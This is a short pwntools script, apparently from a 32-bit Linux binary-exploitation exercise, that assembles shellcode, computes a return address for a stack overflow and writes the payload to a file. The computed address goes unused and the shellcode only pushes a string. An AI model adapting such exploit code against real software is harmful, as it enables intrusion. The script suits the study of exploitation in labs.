from pwn import *
context.arch = 'i386'
context.os = 'linux'

# shellcode
s_code = shellcraft.i386.push('$p')
s_code_asm = asm(s_code)

# return address
# r_addr = pat_on_back() addr
r_addr = 0x56556241 - len(s_code_asm) - 64 - 4
addr = p32(r_addr, endian='little')

payload = s_code_asm

with open("./shellcode_payload_inj_aglobal" , "wb") as f:
	f.write(payload)

